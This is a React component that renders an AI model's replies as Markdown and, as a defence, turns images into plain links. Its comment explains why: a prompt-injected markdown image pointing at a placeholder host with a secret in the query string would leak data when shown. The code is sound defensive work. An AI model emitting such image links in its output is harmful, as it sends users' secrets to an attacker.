import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { useT } from '../i18n';

/**
 * Renders the model's reply as Markdown, 1:1. Links open in the system browser
 * (setWindowOpenHandler only lets http/https through).
 *
 * Images are NEVER loaded: a prompt-injected `![x](https://host/?d=<secret>)`
 * would otherwise leak data the moment the reply is shown. An image becomes a
 * plain link the user can choose to open. (The CSP blocks remote images too.)
 */
export default function Markdown({ content }: { content: string }) {
  const t = useT();
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ href, children }) => (
            <a href={href} target="_blank" rel="noreferrer noopener">
              {children}
            </a>
          ),
          img: ({ src, alt }) =>
            src ? (
              <a href={src} target="_blank" rel="noreferrer noopener" title={src}>
                [{t('md.image')}: {alt || src}]
              </a>
            ) : (
              <span>[{t('md.image')}: {alt}]</span>
            )
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
